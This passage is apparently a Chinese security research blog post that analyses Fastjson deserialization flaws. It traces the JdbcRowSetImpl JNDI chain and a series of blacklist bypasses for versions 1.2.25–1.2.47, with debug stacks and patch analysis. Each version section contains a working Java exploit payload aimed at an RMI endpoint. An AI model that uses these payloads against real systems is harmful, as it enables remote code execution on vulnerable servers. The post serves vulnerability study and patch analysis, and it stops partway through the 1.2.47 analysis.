<h3 id="为什么-bytecodes要base64编码"><a href="#为什么-bytecodes要base64编码" class="headerlink" title="为什么_bytecodes要base64编码"></a>为什么_bytecodes要base64编码</h3><p>Fastjson解析到byte[]数组的时候，会对byte[]数组进行base64decode。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">bytesValue:112, JSONScanner</span><br><span class="line">deserialze:136, ObjectArrayCodec</span><br><span class="line">parseArray:723, DefaultJSONParser</span><br><span class="line">deserialze:177, ObjectArrayCodec</span><br><span class="line">parseField:71, DefaultFieldDeserializer</span><br><span class="line">parseField:773, JavaBeanDeserializer</span><br><span class="line">deserialze:600, JavaBeanDeserializer</span><br><span class="line">deserialze:188, JavaBeanDeserializer</span><br><span class="line">deserialze:184, JavaBeanDeserializer</span><br><span class="line">parseObject:368, DefaultJSONParser</span><br><span class="line">parse:1327, DefaultJSONParser</span><br><span class="line">parse:1293, DefaultJSONParser</span><br><span class="line">parse:137, JSON</span><br><span class="line">parse:193, JSON</span><br><span class="line">main:13, Test1TemplatesImpl</span><br></pre></td></tr></table></figure>
<h3 id="为什么会触发getOutputProperties"><a href="#为什么会触发getOutputProperties" class="headerlink" title="为什么会触发getOutputProperties"></a>为什么会触发getOutputProperties</h3><p>前面我们知道parse函数触发getter比setter苛刻，但是getOutputProperties正好满足要求。</p>
<ul>
<li>TemplatesImpl里只有对应的getter没有setter，setter不会抢getter位置</li>
<li>函数名符合规范</li>
<li>非static</li>
<li>返回值是Properties，是Map接口的实现类</li>
<li>无参</li>
</ul>
<h2 id="JdbcRowSetImpl链"><a href="#JdbcRowSetImpl链" class="headerlink" title="JdbcRowSetImpl链"></a>JdbcRowSetImpl链</h2><p>本质是触发JNDI注入。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1JdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot; ,\&quot;AutoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h3><ul>
<li>因为用的JNDI注入，受JDK版本限制</li>
<li>要能出网，不然无法加载远程类</li>
</ul>
<h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>JdbcRowSetImpl#connect有一个标准的JNDI注入<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698422368971-6be86174-3e37-4d35-a58d-e2e5060b0ae0.png" alt="image.png"><br>存在对应setter可以控制注入点<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698423729449-9b5047c8-bcc1-4bc7-90f7-eb385875c1df.png" alt="image.png"><br>find usage看哪调了connect，在JdbcRowSetImpl#setAutoCommit调用了，以这个做为sink点即可。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698423846048-563056cc-bb62-4197-8462-710029dc5506.png" alt="image.png"></p>
<h3 id="为什么是DataSourceName而不是dataSource"><a href="#为什么是DataSourceName而不是dataSource" class="headerlink" title="为什么是DataSourceName而不是dataSource"></a>为什么是DataSourceName而不是dataSource</h3><p>注意到exp里写的并不是属性名dataSource，而是对应setter去掉set后的字符串DataSourceName。<br>这涉及到fastjson反序列化的属性赋值流程：</p>
<ol>
<li>通过setter&#x2F;getter截断前三字符，确定为propertyName</li>
<li>扫描JSON String，通过propertyName匹配到propertyValue（这是我们控制属性值的地方）</li>
<li>调用对应setter，setter(propertyValue)</li>
</ol>
<p>显然，在第二步扫描JSON String的时候，用的propertyName是函数截断后的字符，而不一定是真的属性名。<br>以上面为例，第二步是按照dataSourceName去JSON String里找对应值，而不是按dataSource去找。</p>
<h1 id="1-2-25-1-2-41"><a href="#1-2-25-1-2-41" class="headerlink" title="1.2.25-1.2.41"></a>1.2.25-1.2.41</h1><p>引入autoTypeSupport，默认为False，开启黑白名单校验与Bypass之路。</p>
<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>修改fastjson版本到1.2.25，再次运行上面的exp，程序抛出异常。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698717429189-80eeaf7e-d424-4e20-b2f1-af9118a4f559.png"><br>注意到异常抛出点：com.alibaba.fastjson.parser.ParserConfig.checkAutoType，下断点调试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">checkAutoType:805, ParserConfig</span><br><span class="line">parseObject:322, DefaultJSONParser</span><br><span class="line">parse:1327, DefaultJSONParser</span><br><span class="line">parse:1293, DefaultJSONParser</span><br><span class="line">parse:137, JSON</span><br><span class="line">parse:128, JSON</span><br><span class="line">main:6, Test1JdbcRowSetImpl</span><br></pre></td></tr></table></figure>
<p>默认情况下，会进入这个IF，对类名先黑名单校验，再白名单校验。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698717639728-09e39775-2594-459c-8063-e9e721548432.png"><br>黑名单里有前两条链子指定的类，所以直接抛异常。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698717888684-0a64b119-f142-4a87-b20c-faa93e50245f.png"><br>开启autoTypeSupport的方法</p>
<ul>
<li>JVM启动参数：-Dfastjson.parser.autoTypeSupport&#x3D;true</li>
<li>代码中设置：ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</li>
</ul>
<p>acceptList添加方法</p>
<ul>
<li>JVM启动参数：-Dfastjson.parser.autoTypeAccept&#x3D;com.xx.a.,com.yy.</li>
<li>代码中设置：ParserConfig.getGlobalInstance().addAccept(“com.xx.a”);</li>
<li>配置文件配置：在1.2.25&#x2F;26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：fastjson.parser.autoTypeAccept&#x3D;com.taobao.pac.client.sdk.dataobject.,com.cainiao.</li>
</ul>
<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>把@type对应的值改成：”L类名;”，如下面的exp所示</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="comment">// fastjson 1.2.25-1.2.41</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>需要开启autoTypeSupport，有点鸡肋。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>按照exp的绕过方法，肯定是能过denyList的，问题是为什么那样写类名也能加载到，需要分析。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">loadClass:1074, TypeUtils</span><br><span class="line">checkAutoType:861, ParserConfig</span><br><span class="line">parseObject:322, DefaultJSONParser</span><br><span class="line">parse:1327, DefaultJSONParser</span><br><span class="line">parse:1293, DefaultJSONParser</span><br><span class="line">parse:137, JSON</span><br><span class="line">parse:128, JSON</span><br><span class="line">main:8, Test2</span><br></pre></td></tr></table></figure>
<p>从下面可以看到，如果类名以”L”开头、以”;”结尾，就会trim掉首尾的字符，然后<strong>递归调用loadClass。</strong><br>所以这种绕过方法是能加载到类的，也就能正常执行exp了。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698738981491-d537178e-29e0-44cf-92a7-b3eceaefe83a.png" alt="image.png"></p>
<h1 id="1-2-25-1-2-42"><a href="#1-2-25-1-2-42" class="headerlink" title="1.2.25-1.2.42"></a>1.2.25-1.2.42</h1><h2 id="补丁分析-1"><a href="#补丁分析-1" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>fastjson版本换到1.2.42，再次运行上面的exp，发现抛出异常了，检测到了上面那种类名写法。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698741593872-0a380d67-9006-453d-9996-57d06b6c5425.png" alt="image.png"><br>被检测的到的原因，是开发人员在checkAutoType里，检测到前”L”后”;”的类名，就提前trim一次。<br>另外，为了提高挖洞门槛，把denyList改成hash值了，不过github已经有<a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">项目</a>跑出来了大部分黑名单类名。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698742254326-a6235a77-e215-4f46-9daf-68504a33f1f8.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698742295676-8f87c893-ebda-4c6f-adcf-46825313086d.png" alt="image.png"></p>
<h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><p>把@type对应的值改成：”LL类名;;”，即经典双写绕过，如下面的exp所示</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fastjson 1.2.25-1.2.42</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="限制-1"><a href="#限制-1" class="headerlink" title="限制"></a>限制</h2><p>需要开启autoTypeSupport，有点鸡肋。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<h2 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h2><p>这里问题在于它提前trim了一下我们的类名，但是实际上在后面的TypeUtils#loadClass里也会trim我们的类名，而且是递归trim，很容易想到双写绕过黑名单。<br>首先，在ParserConfig#checkAutoType里trim一下我们的类名，由于这里双写 ，可以过黑名单。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">checkAutoType:906, ParserConfig</span><br><span class="line">parseObject:311, DefaultJSONParser</span><br><span class="line">parse:1338, DefaultJSONParser</span><br><span class="line">parse:1304, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:9, Test3</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698742671061-892d31eb-edcf-466c-97f4-9a1054ca50cb.png" alt="image.png"><br>然后，我们进到TypeUtils#loadClass里，这里会递归trim我们的类名，最后加载到我们的类。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">loadClass:1131, TypeUtils [3]</span><br><span class="line">loadClass:1127, TypeUtils</span><br><span class="line">loadClass:1144, TypeUtils [2]</span><br><span class="line">loadClass:1127, TypeUtils</span><br><span class="line">loadClass:1144, TypeUtils [1]</span><br><span class="line">checkAutoType:975, ParserConfig</span><br><span class="line">parseObject:311, DefaultJSONParser</span><br><span class="line">parse:1338, DefaultJSONParser</span><br><span class="line">parse:1304, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:9, Test3</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698742892048-e05e79dc-4787-48fe-a561-02a766cbe790.png" alt="image.png"></p>
<h1 id="1-2-25-1-2-43"><a href="#1-2-25-1-2-43" class="headerlink" title="1.2.25-1.2.43"></a>1.2.25-1.2.43</h1><h2 id="补丁分析-2"><a href="#补丁分析-2" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>运行上个exp，报错，双写也被识别到了。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698743073506-9a513a40-2c3b-40ac-bc61-1d8f45996c5f.png" alt="image.png"><br>ParserConfig#checkAutoType下断点调试，看看怎么个事。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698743639941-33ddd478-84c1-4147-8283-d6697f1802a5.png" alt="image.png"><br>发现多加了一层IF，判断类名前两个字符是不是”L”，是的话直接抛异常，这样双写肯定就失效了。</p>
<h2 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h2><p>之前加”L;”的方法无法使用，但是还有加”[“的方法，这是看TypeUtils#loadClass里处理类名的逻辑，自然想到的绕过方法，具体payload为什么是这样，看<strong>调试分析</strong>部分。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fastjson 1.2.25-1.2.43</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="限制-2"><a href="#限制-2" class="headerlink" title="限制"></a>限制</h2><p>需要开启autoTypeSupport，有点鸡肋。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<h2 id="调试分析-2"><a href="#调试分析-2" class="headerlink" title="调试分析"></a>调试分析</h2><p>首先，我们看TypeUtils#loadClass，这里显示如果第一个字符是”[“，就trim掉，然后再执行loadClass，这是我们所希望的。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698750115778-9544d540-76ae-481b-8de6-12b1f83eace5.png" alt="image.png"><br>于是我们构造payload如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>调试分析，发现会抛出异常</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">parseArray:675, DefaultJSONParser</span><br><span class="line">deserialze:183, ObjectArrayCodec</span><br><span class="line">parseObject:373, DefaultJSONParser</span><br><span class="line">parse:1338, DefaultJSONParser</span><br><span class="line">parse:1304, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:10, Test4</span><br></pre></td></tr></table></figure>
<p>提示代码期待在指定位置”,”前面，加上”[“符号。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698750540577-417e8113-7cae-400b-87bf-157dc1928e47.png" alt="image.png"><br>于是我们改进payload如下，加上”[“</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>再次抛出异常，提示我们在指定位置加上”{“符合。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698750783181-80234dfa-4312-4646-8af5-08d8dfac3c85.png" alt="image.png"><br>于是我们再改进Payload如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>成功执行命令。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698750971771-b5591e83-9bae-43d8-b3a5-03d6786f6a92.png" alt="image.png"></p>
<h1 id="1-2-25-1-2-45"><a href="#1-2-25-1-2-45" class="headerlink" title="1.2.25-1.2.45"></a>1.2.25-1.2.45</h1><h2 id="补丁分析-3"><a href="#补丁分析-3" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>运行上面的exp，会抛出异常，”[“的绕过方式也被检测到了<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698751620126-5769e711-7bd5-4fb3-af05-f324f2792e50.png" alt="image.png"><br>开发者在ParserConfig#checkAutoType又加了校验，如果类名开头是”[“直接抛出异常<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698751825640-0d6820b6-fbbe-485c-9895-3b0268173a82.png" alt="image.png"></p>
<h2 id="Exp-3"><a href="#Exp-3" class="headerlink" title="Exp"></a>Exp</h2><p>利用mybatis的依赖里的类，去打Mybatis里的JNDI注入，因为JndiDataSourceFactory不在黑名单里。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fastjson 1.2.25-1.2.45</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="限制-3"><a href="#限制-3" class="headerlink" title="限制"></a>限制</h2><p>需要目标服务端存在mybatis的jar包，版本要求：3.x.x&lt;Version&lt;3.5.0，也存在一些限制。</p>
<h2 id="调试分析-3"><a href="#调试分析-3" class="headerlink" title="调试分析"></a>调试分析</h2><p>JndiDataSourceFactory本来就不在黑名单里，自然就bypass了，这里只看一眼JNDI的地方。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">setProperties:44, JndiDataSourceFactory</span><br><span class="line">deserialze:-1, FastjsonASMDeserializer_1_JndiDataSourceFactory</span><br><span class="line">deserialze:267, JavaBeanDeserializer</span><br><span class="line">parseObject:384, DefaultJSONParser</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:9, Test5</span><br></pre></td></tr></table></figure>
<p>JndiDataSourceFactory#setProperties存在JNDI注入，和JdbcRowSetImpl链子基本一样，不再分析。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698753142868-78aa3c22-d35c-4f9a-9030-99737647af46.png" alt="image.png"></p>
<h1 id="1-2-25-1-2-47"><a href="#1-2-25-1-2-47" class="headerlink" title="1.2.25-1.2.47"></a>1.2.25-1.2.47</h1><p>和之前的绕过思路不同，本质是利用java.lang.Class内置类将恶意类加载进缓存，然后再使用fastjson反序列化去加载这个恶意类时，就会走缓存而不会走黑名单校验，进而成功bypass。</p>
<h2 id="Exp-4"><a href="#Exp-4" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="comment">// fastjson 1.2.25-1.2.47</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(exp);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="限制-4"><a href="#限制-4" class="headerlink" title="限制"></a>限制</h2><p><strong>不需要设置AutoTypeSupport，大大提高了可利用性！</strong><br>下面是对Exp的影响，简单知道结论即可，无非是不同版本的checkAutoType里的逻辑有细微差别。</p>
<ul>
<li>不开启AutoTypeSupport：1.2.25-1.2.47通杀</li>
<li>开启AutoTypeSupport：1.2.25-1.2.32报错，1.2.33-1.2.47打通</li>
</ul>
<h2 id="调试分析-4"><a href="#调试分析-4" class="headerlink" title="调试分析"></a>调试分析</h2><p>这里默认不开启AutoTypeSupport，版本采用fastjson 1.2.47。<br>首先，在DefaultJSONParser#parseObject里解析JSON字符串，解析到第一个key是”a”，当检查到下一个字符是”{“的时候，程序认为a的值是一个对象，于是递归调用parseObject函数去解析这个对象</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">parseObject:544, DefaultJSONParser</span><br><span class="line">parse:1356, DefaultJSONParser</span><br><span class="line">parse:1322, DefaultJSONParser</span><br><span class="line">parse:152, JSON</span><br><span class="line">parse:162, JSON</span><br><span class="line">parse:131, JSON</span><br><span class="line">main:6, Test6</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698770139713-0b121b72-5cbe-4ece-b9ab-28e669fe6907.png" alt="image.png"><br>然后，继续解析又发现对象的key为”@type”，先调用checkAutoType()对传入的类名做检查</p>
